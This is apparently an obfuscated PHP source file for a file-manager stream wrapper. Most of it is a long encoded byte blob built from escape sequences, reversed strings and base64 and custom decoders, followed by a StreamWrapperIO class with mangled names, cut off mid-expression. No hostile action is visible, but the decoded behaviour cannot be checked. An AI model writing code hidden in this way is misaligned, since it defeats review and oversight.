02\254\165\135\127\3\46".strrev('Ú“y+˜¼*^wæ¿ßÆÄÀò?²;5ê— PtŠTİ/uG¨zB«éä@ZÈkiiq').strrev('·•`(oZ*TEY?ÿ|P‹—é8GEß°@(œ9$UìS\'+¥}Øns‰æX×ç~H÷émv\\L¼')."\63\77\132\314\171\261\234\314\33\227\275\206\272\336\165\252\161\346\307\222\56\147\176\231\45\110\212\255\65\53\202\364\275\251\172\105\176\15\116\162\203\116\244\250\164\357\142\252\126\0\303\334\2"."\3\31\116\75\357\161\316\0\250\116\6\340\124\127\173\261\252\214\27\161\361\170\215\241\205\153\33\322\103\13\162\26\347\363\142\356\107\307\334\243\100\212\140\261\253\127\176\360\154\4\35\302\160".strrev('kš,»Ç>¼Â\'HdD|©[,dX·J‰\'÷),éeÊ,ç„š›e ŠU5#^¸…‹Æœ~2')."\176\243\351\176\366\105\234\257\265\322\127\111\126\147\123\112\335\234\372\171\213\352\231\271\356\114\246\321\124\314\63\143\5\24\144\257\226\114\367\367\61\132\43\236\13\143\175\303\23\56\275\245\343"."\0\213\141\344\157\224\60\42\345\310\47\132\353\170\354\16\72\112\345\107\322\343\77\344\102\211\222\50\254\347\247\362\107\222\312\120\153\203\75\200\45\275\52\301\347\241\237\5\12\374\24\257\211"."\225\321\233\31\20\35\40\144\5\20\173\0\265\317\24\147\41\302\205\112\4\41\231\56\346\6\32\244\104\305\66\115\45\253\345\106\341\210\71\303\252\237\141\55\306\37\152\300\206\50\326\14\366"."\x42\x16\xde\x98\x84\x23\x54\xea\x6c\xb\x52\xe8\x5d\x99\xf\x3f\x77\xe7\xc3\xbb\x5e\xac\x8\xb9\x3a\x8\x4d\xa7\x61\x78\x5d\xc\x12\x22\x9d\x2d\xe1\x76\x49\xf7\x50\x2\xa8\xc1\xa6\x76\x35\xd0\xd1\x51\x36\x1\x86".strrev('^„>”EÄ©% ¸ É*ƒğ¯y’B¬P­'."\n".'†§SbIJéĞKCJu¿t-oâ±¬Š')."\242\311\225\113\227\370\15\50\351\363\237\214\151\264\37\53\361\345\146\342\251\223\165\212\10\264\131\370\53\123\224\45\232\102\207\253\241\222\134\300\124\52\151\264\217\163\15\346\245\356\302\374\175".base64_decode('uiV+TU7EqyVmsiMgP3YPcc+eZe/eAtJjAuSBqKCWW1FaBFfuS8pJ7CHRNBEXuG55l+SXLsE=')."\x57\x46\x4c\x4d\xd0\x4f\x22\x4b\xfc\xf9\xa5\xf2\x6c\x13\x7b\xb4\xd2\x8f\xf9\x89\xb4\xc8\x2f\xc4\x13\x2a\x7d\xf2\xb5\xfc\x45\x27\xbf\xdf\x2b\x83\x47\x58\xa5\x7\x21\x3f\xd3\xa5\xd0\x92\x3\x18\x11\xc5\x16\x1\xcd"."\x80\x84\xe\x2c\x6c\xa0\x9\x8e\xa7\x55\x6c\x49\xb\xab\x88\xed\x47\xc9\x6d\x51\x41\x3c\x9d\xb7\x6e\x1d\xad\x8\xbf\x6b\xb4\x7e\x7d\x29\xc\xf4\xba\xdd\x49\x81\xbc\xe1\x6\x61\x84\x73\xc3\xb0\xd0\x47\xc0\xd0\x5e"."\347\374\14\105\166\71\223\200\260\74\364\127\224\211\264\267\210\10\75\256\73\22\273\230\106\26\211\165\167\125\372\146\255\137\357\67\230\366\43\323\274\142\145\175\74\67\215\167\373\234\371\121\117".strrev('<•‰ÎHd.Ôj{îy²%M,=W³‹´°ĞØú¬µÊŒa,ÿPè°'."\r".':¤Rs¸'."\0".'Fyè`')."\154\27\14\70\35\70\327\222\242\104\312\107\44\170\1\247\53\363\145\342\245\101\271\50\15\7\362\216\132\231\44\223\134\243\145\214\136\77\47\41\364\152\315\227\24\166\233\54\13\41\140\56\70"."\x56\x60\x74\x25\xe0\x57\x8b\x8\x78\x8\x51\x58\xb3\xc0\x49\x1e\x87\xa3\xba\x38\x10\x50\x1e\x93\x25\x89\xa\xf1\xe4\x25\x56\xb2\x60\xe4\x6d\x7\x49\xa4\x6f\x68\x57\x90\x47\xe9\xd6\x6a\x43\x1a\xcd\x52\xa1\x80\x74"."\256\241\202\274\343\121\201\226\67\115\141\164\220\67\160\11\376\32\342\217\63\15\25\244\23\126\132\327\121\171\102\346\312\175\4\25\254\120\30\41\316\152\174\34\13\266\211\66\124\156\6\10\117"."\x82\x76\xc6\xc0\x60\x2a\xd0\xe\x17\x9a\x27\x9f\x49\x7f\x4f\x39\x99\x61\x15\x79\xaf\x34\x83\x18\x67\x62\xe\x42\x48\x1e\xe1\xce\xfb\xb0\xd4\x95\x66\x82\xa7\x49\x3b\x62\xd1\x44\x34\xc8\xde\xf3\x73\x8a\x67\x29\x6c"."\56\73\151\130\324\2\126\34\316\230\65\37\327\202\142\71\70\213\341\7\10\140\103\241\230\313\161\5\124\214\273\174\153\154\50\377\247\213\334\271\352\251\236\51\322\225\56\215\335\310\202\14\231"."\x5e\x31\x33\xfb\x55\x68\x27\xda\x84\x13\xd8\xed\x80\x5\x60\xc9\x13\x2a\xf6\xc3\xaa\xa7\x7c\x5d\xd4\xaf\x42\x43\xd\x33\xe9\x62\xea\xae\xc2\xf4\x93\xe5\x94\x53\x14\xbc\xab\xf4\xf0\x51\x47\xb4\xc0\xf\xa4\x54\xac"."\262\112\174\211\10\57\131\125\172\52\253\174\263\252\53\113\123\250\142\261\63\35\153\355\251\247\305\121\42\274\33\5\334\1\261\231\14\106\302\241\366\204\32\6\306\240\266\156\201\257\106\330\63"."\x1a\x96\xf0\x2c\x4c\xc3\x41\xae\x6\x55\xd0\xc9\xa8\xfa\x1c\xdd\x2a\x33\x34\xf4\x8a\x25\xc1\xd5\x62\xf5\x9c\x43\xe2\x4a\x87\x34\x63\x32\x5f\x2f\x75\x35\x35\x35\xde\x9a\x5a\xf4\x3f\xb3\xf3\x60\x9e\x36\xeb\x6b\x6a".base64_decode('SrLU1NST/2kCueYAFHSmIPLI6DpkGNZ1aBDso+i4XGRMaVcQW6oquGkwLUKtF2EfcUXLSKw=')."\343\265\124\205\150\24\100\114\27\203\220\225\136\370\214\203\353\342\176\7\266\263\333\0\352\246\34\76\212\16\141\271\176\62\100\320\166\156\22\215\262\211\25\264\230\32\252\67\360\6\206\162\251"."\x2e\xf9\x63\x3e\x36\xd0\x14\x28\x3c\xf8\x7b\x59\x82\x57\x7e\x48\x7\xa\x51\xa2\x27\xae\xb\x1d\x4d\x43\x65\x9c\xfe\x6e\x31\x4\x31\x48\x49\xde\x67\xc\x90\x24\xb3\x98\xfb\x95\x7c\xf8\xe2\xa8\x7c\x2b\x48\x92\xb9".base64_decode('XTGJZbhHFxxt5zXR95roG3IwhmVWZNocVgXPgqOn8RgZUnz8ZCiZkmy/8biy/UnKzpXnhG4=').strrev('ŸÄâQ¡Å'."\0".'«ÚÍwª+%üßDE½wn/PÜkeø’ÎOYÆ.Øò¢¥PJ¸q‘€ÉÄs0')."\x3e\xe9\x4c\x84\x3c\xf5\x87\x96\x4c\xb8\xed\x9e\x6c\x32\x6f\x8e\xcb\xd\xb7\x16\x23\x8b\x49\xb3\xc7\xee\xbb\xe2\x5f\xa1\x68\xc8\x20\x21\x6\xa0\x37\x75\x41\xee\x0\x57\xaa\xc0\x9d\xe4\x2a\x13\xa0\xd7\x64\x25\x5"."\0\136\232\233\334\46\226\311\215\341\256\334\304\325\155\220\173\364\226\375\337\122\371\224\244\262\146\301\263\46\102\137\210\325\61\44\235\126\175\371\202\331\217\60\301\222\7\15\301\73\312\203\171"."\xf6\xd2\x9c\x65\x32\xf1\xd6\xcb\xf9\x64\x20\xbe\xb7\x64\x6f\xc5\x3\x6a\x9\xf7\xa\x5a\x8a\x6f\x9e\x52\x56\xf1\xea\xa3\x4\x74\xae\x70\x29\x21\xc8\x1f\x9c\x93\x81\xf8\x18\x2c\x6b\x88\x91\x13\x88\xb3\xe\x7c\xbe".strrev('z2üB	Á—,'."\n".'Œ)ÂpüP'."\r".'!L«†@ê©Fü•QaJ‚l°¼+\'Õœ´bLtöËxBv')."\2\232\103\241\164\121\341\12\42\354\155\353\270\303\135\74\240\51\54\335\206\6\271\230\63\355\275\363\56\143\201\53\130\56\74\254\374\135\130\371\332\15\17\251\52\313\222\360\212\156\265\155\350"."\123\31\104\164\42\133\11\126\221\175\35\127\120\317\311\222\24\303\265\263\33\117\164\0\7\67\66\36\14\126\350\233\353\12\176\130\176\272\163\176\112\13\300\263\157\46\342\56\261\67\155\271\20"."\xae\xab\xd3\x45\xa2\x96\x73\x2a\x89\x63\xbc\xad\x94\xb5\x63\xca\xb4\xca\xc\x5f\x1d\x28\xfa\xce\x60\xf\xbe\x50\x1a\x2d\x74\x2d\xfc\x96\x23\x1\xa1\x14\xe6\xb5\xd8\xc6\x8f\xfa\xda\x83\xce\x4a\xe3\x7c\xdb\x81\x59"."\352\242\144\233\175\10\367\3\102\51\66\151\212\163\33\226\66\25\105\256\10\155\317\211\64\26\22\365\50\244\355\213\311\43\41\145\122\261\127\21\366\65\356\156\34\266\3\224\307\264\371\371\32"."\127\37\110\111\373\154\104\146\212\61\240\111\347\117\137\44\150\15\336\245\242\345\213\65\336\150\131\355\100\172\3\201\27\102\355\343\16\121\306\214\74\171\141\102\222\0\270\242\156\165\137\134\102"."\xe2\x8a\x50\x54\xda\xb1\x9\xbf\x60\xb3\x2d\x9f\xbd\x2f\x21\xd4\x64\x49\x50\x10\xe9\xf7\xae\x3d\x8f\x5\x36\xa\x5c\x8b\x4b\xda\x95\x65\xda\x7\xb5\xf2\x3a\x71\xb\x72\x42\x4b\x17\x18\x9f\x82\x9e\x34\xb\x29\xbc".base64_decode('aUpufXJ2TO+Xo0Svga0Y4ZtergJ7gZNIE16pgaRdlH3KSc9XoJikzSUxs95ahXPBKq2ZRmY=').base64_decode('SwkkfzmG2CX5lWz0iGAsXuzl19Qu1pSZ/Sky58fs+HAFxKsW7oElp6Fqsdt40TO5CPlmSRE=')."\x9a\x86\x99\x2f\x61\xf0\x27\xa7\x58\xf8\xa1\x92\x4e\x36\x8b\xe5\x52\xca\x7c\x8a\x24\x49\x23\x9a\xe4\xdc\x38\x8c\x8e\x18\x24\x48\x18\xd5\x99\x7e\xb9\xb7\xb6\xce\x3b\x7\x4e\x41\xb2\x11\x20\x3b\xe0\xd1\x18\x3e\x7c".base64_decode('SmiAj8iM1IF2NuQTeUzpwp84nxK+dIjHLT6fxDUXj+lcW5t4o5LJvdBfokrcOENnuXQ6Kjg=')."\271\311\241\166\357\312\200\326\204\63\35\136\37\21\14\17\165\210\145\72\224\40\135\225\300\53\71\362\373\52\244\224\350\207\260\115\100\40\223\276\161\42\15\206\320\303\242\176\272\230\361\5\247"."\163\2\234\60\71\260\124\227\13\143\42\124\111\75\44\300\111\271\252\32\173\110\160\110\54\333\106\271\35\73\326\223\304\233\67\127\266\267\344\10\113\345\10\151\71\42\124\361\324\121\232\203\170"."\xae\x61\x9d\x39\x3b\x60\x27\xfc\x8e\xd6\xe\x3f\x7\x35\xf2\x25\x49\x5\x2c\xc2\x5f\x61\x90\x29\x5f\xea\x23\xcc\x11\xe8\x70\xd6\x48\x2a\x91\x68\x4b\x38\x18\x88\x34\x85\xe3\xcb\x95\x7e\x7c\x6b\x2b\x74\x12\x51\x73"."\125\262\124\125\113\74\370\103\127\12\221\120\323\31\140\50\335\313\337\315\301\101\157\57\72\122\170\123\374\50\146\211\103\27\351\24\124\46\336\55\164\126\113\21\121\57\224\324\230\303\306\211\231"._kodDe('MR9/20UTSzNkenW5km/mh0tBbNe0P32SeLLvmh/pbqzSCy1/KhBgNjs6vGXCJBBFUUVzmeKx')."\250\134\173\240\251\55\334\256\6\42\221\350\112\207\276\262\270\161\50\160\231\113\112\176\263\112\232\31\61\11\364\353\262\43\114\31\342\170\324\303\45\207\241\323\47\173\151\315\263\313\61\170\155"."\227\77\104\103\243\322\233\162\371\202\146\130\272\4\240\317\237\325\202\275\237\226\311\70\136\216\315\364\111\321\242\163\133\55\373\51\225\176\200\301\10\317\73\165\206\130\270\245\65\361\77\156\252"."\221\22\276\13\215\24\123\104\343\266\335\364\215\232\240\374\336\60\373\246\170\11\251\24\362\77\175\223\317\43\56\30\125\342\276\215\75\12\152\222\23\24\260\367\24\26\216\252\104\176\256\212\117".base64_decode('IGalMJqXL3b9KagBe5cNMZMlHBFHGJwLKsFfoQdbdF7Hskd22GFyPEQ5YMAdypeuRwXdavs=').base64_decode('jicDS75BnqGhaV24Fyhnj+gTinEld1HUnVKmAShZERIxnkFpUGro85f8SSFlCfNgIT5A/Cg=')."\x86\xb2\x79\xdb\x71\xe8\x6f\x95\x8d\x78\xa4\x29\x61\xb3\xa4\xca\xfb\x20\x96\x16\x15\xb8\xe8\x8f\xa2\x0\x8b\xe2\x79\x86\x30\x21\xbd\xe2\x28\x88\xf5\x32\xcd\xec\x68\x9\xc0\x21\x3c\x8b\xb0\xde\x70\xd\x69\xfc\xc"."\123\256\317\224\107\235\150\370\143\73\56\372\252\55\225\111\170\320\51\104\267\113\337\301\243\305\377\377\24\244\211\161\311\125\260\263\222\322\6\131\356\55\223\157\167\16\143\4\362\336\137\332\34"."\x76\xbe\x7b\x8b\x21\x12\xb7\xc6\xc\x20\xa4\xf2\xd2\x7a\x23\xde\x19\xe4\xe7\x8\x1d\x36\x10\x8e\xa7\xa6\x68\x82\x42\x5e\x2f\x57\x10\x69\x2\x4c\xc0\x8a\x40\x96\xbc\xe6\xa5\x6f\xcf\xa0\x3f\xdd\xf0\x6b\x4e\xd1\x8"."\112\365\340\223\325\34\61\203\151\43\223\52\160\25\57\1\150\323\205\130\202\224\102\144\46\257\261\127\332\311\343\237\60\102\374\75\256\162\357\76\142\157\253\316\147\305\304\153\155\142\43\166\276"."\x5e\xc5\xf5\xa\x2c\xb1\xa0\x2c\xdb\xf1\x5e\x5a\xc2\x4c\x68\xfd\x1e\x8a\xdf\x98\x44\x8a\x58\xe3\xa8\x1c\x96\x75\xf8\x49\x2f\x50\x22\xc\xa4\x21\x6c\x80\x97\x32\x88\x87\x3c\xe7\x49\x29\xa3\xfb\x91\x2f\x69\x85\x72".base64_decode('AizbufQTx6Ggc+gyzu43dLaJOLJRkF/L58Xlibznon8dxt+Q1ploVYk7FJUqR8QFnkkXmhQ=')."\x8\x97\x9b\xc5\x5c\x98\x5e\xe2\x38\xa0\x5\xe9\x94\x28\xbb\xd9\xa6\x17\x3b\xc2\x32\x18\xb2\xa3\x76\x76\xd0\x5b\x5d\x18\x30\xb9\x4a\x76\xd3\xce\x5\xf1\x88\x22\xf1\xc3\xb4\xbf\xf4\x66\x1e\xab\xab\x1\x4d\xc1\xea".base64_decode('QUwva8AkhzGffIyDDMoS5sgGMZpegRmOVY0xCbHY9O1UQjZkKlgeSphvQmm9QCiYuSzd97A=')."\323\10\346\236\66\303\217\135\374\11\127\51\312\127\201\363\101\72\272\134\310\117\223\336\307\317\124\70\56\330\13\331\47\224\120\7\162\77\272\132\372\200\54\173\54\226\255\67\170\51\266\314\363"."\257\123\276\36\353\21\126\344\373\172\347\116\330\54\347\321\134\72\237\2\346\314\11\77\302\224\234\202\334\7\40\76\31\256\2\61\367\204\45\314\122\21\266\120\176\160\274\155\53\365\232\2\312"."\274\217\53\15\203\324\357\142\41\343\41\172\40\36\246\172\131\366\211\135\307\253\173\356\11\55\207\22\70\32\315\310\135\356\54\144\304\333\225\264\105\142\66\345\51\372\312\306\200\125\6\71\73"."\246\234\144\266\176\111\157\201\135\260\273\263\31\216\325\202\330\4\141\2\111\75\143\227\354\110\253\263\251\272\71\363\26\311\162\31\61\375\342\332\171\16\375\201\333\163\140\261\4\102\51\343\362"."\20\172\24\346\216\133\46\75\44\321\151\346\123\372\26\264\153\313\371\237\55\66\161\366\241\131\45\325\142\136\137\271\347\37\45\34\227\164\336\134\52\112\46\326\32\262\244\145\352\254\221\362\50".strrev('ÛÇ'."\n".'¬·M´k“øt²D{ˆ’§1C,Ieı#¶w-èyÍØ@_@`Ì×»}–—*+Ze').strrev('Õêüü“²ô}%™÷™QÊŸğQÎxÄ;îá·hO‘èã‰¦>ÂË±‹°àsF¶‘-').base64_decode('bK+8SIWsU7ejZHaBoIhjtrPfrupRMVFHj0eZKlOJUaz8jLNwFCnxj7g0M6GfQkpBLLidnJg=')."\374\124\54\61\176\26\176\216\310\2\165\54\126\311\213\275\154\74\114\52\222\127\101\151\325\322\303\273\102\234\105\344\137\320\43\130\302\104\243\203\64\63\320\302\215\317\65\111\125\321\51\143\143"."\236\122\304\203\363\150\370\244\67\331\115\71\54\75\350\214\166\215\50\263\353\100\315\161\234\225\121\134\370\155\227\250\124\312\5\144\143\106\110\203\170\175\234\60\324\263\200\225\226\135\34\70\116"."\147\374\145\122\307\151\315\162\77\117\214\170\117\307\273\62\251\222\307\340\201\130\22\63\76\372\65\151\253\146\115\354\227\102\355\305\254\210\110\262\152\162\304\343\211\16\117\20\330\71\242\213\142"."\60\377\22\226\353\301\163\352\205\235\206\331\331\343\377\370\145\336\377\133\17\362\316\253\141\267\12\334\10\20\177\210\133\35\266\300\121\0\232\215\357\171\271\234\205\212\266\135\35\162\356\255\323"."\0\271\320\54\370\206\4\255\41\161\256\364\316\74\145\62\7\232\32\273\6\324\62\31\151\7\56\177\170\52\171\172\35\341\344\0\177\153\273\134\304\155\255\354\176\206\275\213\110\231\331\73\352"."\75\202\274\140\130\271\142\362\343\315\256\207\333\111\135\10\42\325\302\165\41\41\63\220\122\176\330\53\263\62\50\210\361\373\202\346\345\214\344\100\31\145\0\242\41\354\174\207\101\142\161\112\262"."\x89\xe6\x23\x4e\x88\x2b\x29\xb3\x50\x12\x9f\x72\x89\x1f\x1e\x98\x6\xd9\x53\x42\x34\xcf\xce\xc3\xd5\xb0\xcb\xf4\xc0\x2f\xf8\x67\x1\xa2\x28\x13\x42\x7\xa8\x84\x7c\x26\x1c\x93\xeb\x0\xca\xf3\x26\x68\x9c\xcf\xe9"."\x18\xa\x4a\xb4\xb9\xde\x96\xa6\x99\x2c\x79\x6c\x1d\xf7\x1c\xa5\xba\x21\xa5\xa5\x39\x65\x91\x8b\x60\xa3\x5\xa7\x7c\xf\x4f\x2b\x39\x18\xd5\x78\x5d\x80\x5a\xaf\xab\x3a\xfe\xbc\xb6\x73\xd1\x38\xde\x7b\xa6\xfa\x34".base64_decode('aKXFsByHyfPI9Ri5S/eWlqELJC7yTLFEy1MM3igh08QheTwY5ekomITddEK5bEvSFU9KgmM=').base64_decode('NwdJwTN8ckfkC2TnjRRWUBTXsoloLKSuDGOvHuEzQp3Mg7VhkidgWJWdbVXEYg8WADpHNZs=')."\x2\x95\x74\x44\x1e\x25\x29\xb6\x70\xc3\x6c\x67\xf3\x41\x7e\x89\xec\x34\xeb\x96\xcc\x44\x98\x8f\x33\x59\xae\xea\xcc\x8c\x4d\x7c\x9c\x6b\x71\x69\xb9\x6c\x49\xb3\x60\xc9\x3e\x4c\x1d\x89\x98\xad\x33\x51\x6a\x8c\x89"."\x2\xfa\x98\x26\x48\x67\xe\xad\x68\x3d\x69\xeb\x29\x5\x73\xa\x8e\x23\x42\xd7\xdc\x9a\x39\x3d\xfb\xaa\x6e\x2e\x7b\x76\xf\xe5\x9c\xfb\x15\x39\xe1\xac\x12\x9f\xe3\x65\x4a\xcd\x2c\x4f\xd9\x72\x26\xf5\x46\x54\x2e"."\15\41\151\334\166\140\223\170\152\310\375\304\220\363\111\241\172\111\340\113\137\153\162\274\105\126\62\111\355\146\120\360\60\256\64\114\43\246\116\305\7\145\176\145\316\36\227\301\112\202\176\354\22"."\xd\x1b\xb4\xf8\x9\x22\x82\x9c\x7e\xb5\x9a\x55\x99\x7e\x14\x16\x4f\x8\x29\x15\x21\xbd\xa5\x47\x4c\xf8\x92\x5d\x18\x8d\x16\x62\xd9\xf6\x12\x47\x82\x4e\xdb\x34\xa9\x3c\x91\x5d\x51\x71\x94\x43\x2a\x5\x4a\x10\x32".strrev('¸Ògzd‘V\\,  ì_¢ó¼Å)2R"4[ÉoÙ¸'."\n".'µ;k] Ô:«ÌÀH’9Ùó”»§@'."\n".'RH')."\x57\x38\x77\xa9\x4e\xc7\xc9\x59\xd2\x41\x48\x12\x62\x12\x2a\xbd\x72\x16\x37\xe1\x12\x23\xcb\x8a\xe1\xa3\xb7\x60\x26\x5c\x70\x89\xf8\x8a\xed\x51\x1b\x12\x6c\xb9\x38\x16\xa6\x52\xcd\xda\x50\x99\xac\x29\xdd\xed\xd5"."\xf\x41\x78\x56\xc2\xd6\x4b\x9e\x45\x84\xf9\x91\x3e\x2c\x7f\x1d\xf2\x9\x73\x1f\x47\xc6\x52\xa8\xf0\x3c\x22\x95\x17\x77\x8e\xa2\x9b\x18\x56\xae\xfb\x84\x18\x3a\x8b\xcb\x9e\x4d\x38\x52\x9\x10\x7d\x7c\x8b\x2b\xec"."\110\107\160\254\340\44\64\171\150\127\270\54\112\174\322\351\107\205\147\343\163\206\362\20\103\104\257\3\352\222\42\140\261\37\343\75\135\111\40\10\223\252\57\53\57\223\120\100\317\104\244\352\144"."\x15\x84\x29\xb\xc4\xcb\x7f\x44\x60\xa5\x73\x88\x25\x7\x34\x22\x81\x71\x37\x72\x2d\x8e\xed\x8d\x77\xc\x72\xc6\xe4\x44\x47\x73\xca\xa0\x6\x3b\x8e\xc8\xe2\xdb\xd2\x44\x33\x93\xc1\x97\xca\x53\x24\x53\xad\x64\x69".base64_decode('My7NIaS8tEHk9C0WDgVmyRUJTQs4k2h+3TVucgH3mNISjrcuZfiwYSfTkqigNLEUXiiZZmg=')."\100\371\176\270\133\313\146\331\55\100\21\225\224\264\107\322\246\112\230\145\312\320\26\225\55\106\223\160\111\161\24\163\224\235\142\10\160\131\232\204\313\226\44\263\302\45\343\112\312\331\132\321\232"."\xa2\x7b\xa5\x83\x7\x2\xb9\x54\x99\xe\xb\xb1\x95\x94\x75\xaa\xf1\x2c\x9b\xb9\xf4\x73\xb0\x6\xdc\xb9\x89\x4\xaf\x7c\x2b\x84\xe0\xcd\xa5\xd8\x52\xae\x15\x65\x33\x4f\xd9\xa\x77\x6e\xc1\xf\xe1\x83\x77\xb9\x94".base64_decode('sgsU3O2X2TFYSpk9gtK/KTXFhPZU6WYl0sroctFPYs5MdtxZJllWDCuvOhYrS98sp06XC+4=')."\160\331\114\111\22\215\60\175\317\202\76\50\233\356\42\156\61\143\14\10\55\132\146\155\3\262\27\256\203\72\220\63\371\76\231\22\232\323\230\311\13\24\334\303\136\122\233\163\45\344\212\322\33"."\1\145\215\177\74\130\130\126\52\210\312\150\334\72\123\150\26\322\163\276\151\33\111\335\371\20\201\354\113\220\246\263\217\144\44\1\274\113\52\56\104\167\16\315\243\62\262\142\2\242\101\237\270"."\xc2\xa2\xf5\x89\xbe\x48\x28\xe2\xb0\xd3\xa3\xbc\x11\xdc\x17\x52\xbd\x83\x20\xbe\x14\xe4\x77\xcc\xc4\x47\x3e\xe5\x25\x68\x72\xdc\x2c\xd8\x1e\x9c\x96\x30\xf3\xe4\xb7\xd1\xb4\x6d\xa1\xc6\x43\xa5\x63\xe4\x44\x80\x19"."\2\217\244\245\206\102\342\162\31\67\212\134\125\22\54\46\4\214\4\101\3\2\113\233\342\72\115\45\144\317\21\301\127\240\74\42\357\367\160\301\331\134\164\351\152\10\300\200\231\352\65\107\230".base64_decode('B02EV9Igibstzc3kDrntxmWdO+IaxvLTFD+8euUldcALvb61+X5HcfqUKFee31cNcKEhqqA=')."\117\336\20\351\62\330\21\306\23\361\222\244\216\100\74\276\62\32\153\242\57\344\224\44\223\122\222\62\143\111\122\107\153\264\175\252\264\120\133\40\34\51\111\303\172\217\355\252\360\306\112\223\302"."\x1d\xa4\x95\xe4\xca\x7f\xaa\x56\x84\x83\xcb\x45\x4b\xd8\x9d\x60\x4\x5e\x42\x15\xb3\x20\xdd\x91\xe5\xd3\x26\xbb\xfa\x62\xf9\xe3\x1a\x7b\x80\x5c\xbe\x5d\xd1\xb3\xc2\x39\xaf\x28\xe3\x94\xc2\xc9\xb3\x6d\x31\x2f\xda".base64_decode('POB8hNKlaOzUjWFIDdVidcZ2+FIsD1D8qhCnDfywIbRofA4FHQlO1g8hSBJeyls/uUPlwjk=')."\x92\x3c\xab\xec\xe0\xc9\x37\x31\xa5\x77\x81\x24\x55\xc\xe\x6e\xe6\x69\x26\xa8\xc8\xae\x35\x7b\xc5\xf9\xe\xe\x7e\xe0\x1d\x0\x86\x5b\x52\x60\xa5\x61\x47\xb2\xad\xf5\x33\xd9\xa9\x43\x1d\x85\x8a\xd4\x31\xbd\x10"._kodDe('KuK2A/Potk8Or+v09A==').""."".base64_decode('')."", 10, -8))); goto C¥—œ„¶Ë; eÎœÄè‹¾: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ãÕÌô, $ãŞïÀæç = '') { $this->info = $this->info($ãÕÌô); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[äô®•½Â][87]]; $this->pathOpen = $ãÕÌô; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ãÕÌô])) { self::$_chunkBuffer[$ãÕÌô] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($í†¯Áœ¨) { $º¥´üøá = $this->fileSubstr($this->pose, $í†¯Áœ¨); $this->pose += strlen($º¥´üøá); return $º¥´üøá; } public function stream_tell() { return $this->pose; } public function stream_seek($ß²íÊé, $úõ êıÁ) { $¤ÔÇ‹Şé =& $_SERVER[äô®•½Â]; if ($úõ êıÁ == SEEK_SET) { $this->pose = $ß²íÊé; } else { if ($úõ êıÁ == SEEK_CUR) { $this->pose += $ß²íÊé; } else { if ($úõ êıÁ == SEEK_END) { $this->pose = $this->info[$¤ÔÇ‹Şé[79]] + intval($ß²íÊé); } } } if ($ß²íÊé < 0) { $this->pose = $this->info[$¤ÔÇ‹Şé[79]] + $ß²íÊé; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[äô®•½Â][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($÷ñ°–„€, $ÀÜ‘¼•) { $Ô¢ÕĞÖè =& $_SERVER[äô®•½Â]; $Š€Ú¡Êº = $this->info($÷ñ°–„€); return array($Ô¢ÕĞÖè[1405] => 0, $Ô¢ÕĞÖè[1613] => 0, $Ô¢ÕĞÖè[16] => 32768 + 511, $Ô¢ÕĞÖè[1614] => 0, $Ô¢ÕĞÖè[1615] => 0, $Ô¢ÕĞÖè[1616] => 0, $Ô¢ÕĞÖè[1617] => 0, $Ô¢ÕĞÖè[79] => $Š€Ú¡Êº[$Ô¢ÕĞÖè[79]], $Ô¢ÕĞÖè[1618] => $Š€Ú¡Êº[$Ô¢ÕĞÖè[1460]], $Ô¢ÕĞÖè[1575] => $Š€Ú¡Êº[$Ô¢ÕĞÖè[88]], $Ô¢ÕĞÖè[1574] => $Š€Ú¡Êº[$Ô¢ÕĞÖè[234]], $Ô¢ÕĞÖè[1619] => 0, $Ô¢ÕĞÖè[1620] => 0); } static $fileInfo = array(); public function info($†È§øüƒ) { $Éá‰ë = $_SERVER[äô®•½Â][1621]; if (isset(self::$fileInfo[$†È§øüƒ])) { return self::$fileInfo[$†È§øüƒ]; } if (substr($†È§øüƒ, 0, strlen($Éá‰ë)) != $Éá‰ë) { return !1; } self::$fileInfo[$†È§øüƒ] = IO::info(substr($†È§øüƒ, strlen($Éá‰ë))); return self::$fileInfo[$†È§øüƒ]; } public static function read($ûØş‹Ğâ, $²ÍÑëÂ, $Ø™¦€´ª) { if (!isset(self::$_fopenCache[$ûØş‹Ğâ])) { $¸Âñ»¸ = new StreamWrapperIO(); $¸Âñ»¸->stream_open($ûØş‹Ğâ); self::$_fopenCache[$ûØş‹Ğâ] = $¸Âñ»¸; } $¸Âñ»¸ = self::$_fopenCache[$ûØş‹Ğâ]; return $¸Âñ»¸->fileSubstr($²ÍÑëÂ, $Ø™¦€´ª); } public static function _read($•ù‚ğÎ, $”‚ª¨§«, $éÖıôæ¾) { $óÅ¨êêæ =& $_SERVER[äô®•½Â]; $«ì›Öšñ = fopen($•ù‚ğÎ, $óÅ¨êêæ[1464]); if (!$«ì›Öšñ) { return $óÅ¨êêæ[12]; } $ª…Ïñğ° = 8192; fseek($«ì›Öšñ, $”‚ª¨§«, SEEK_SET); $“¾¾ª›¹ = $óÅ¨êêæ[12]; $äÒø–‰ú = 0; while ($äÒø–‰ú < $éÖıôæ¾) { $¬·¾Ù»¶ = min($ª…Ïñğ°, $éÖıôæ¾ - $äÒø–‰ú); $“¾¾ª›¹ .= fread($«ì›Öšñ, $¬·¾Ù»¶); $äÒø–‰ú += $¬·¾Ù»¶; } fclose($«ì›Öšñ); return $“¾¾ª›¹; } public function fileSubstr($ˆëÉ©âå, $¦ÏØòé‡) { $ñË¼¡£ï =& $_SERVER[äô®•½Â]; $‡çÂÁœƒ = $this->info[$ñË¼¡£ï[79]]; $·˜€§¡£ = $ˆëÉ©âå; $üæí­øÊ = $¦ÏØòé‡; if ($ˆëÉ©âå < 0) { $ˆëÉ©âå = $‡çÂÁœƒ + $ˆëÉ©âå; } if ($¦ÏØòé‡ === !1) { $¦ÏØòé‡ = $‡çÂÁœƒ - $ˆëÉ©âå; } if ($ˆëÉ©âå + $¦ÏØòé‡ > $‡çÂÁœƒ) { $¦ÏØòé‡ = $‡çÂÁœƒ - $ˆëÉ©âå; } if ($¦ÏØòé‡ <= 0) { return $ñË¼¡£ï[12]; } if ($ˆëÉ©âå < 0 || $ˆëÉ©âå >= $‡çÂÁœƒ || $¦ÏØòé‡ <= 0 || $¦ÏØòé‡ > 1024 * 1024 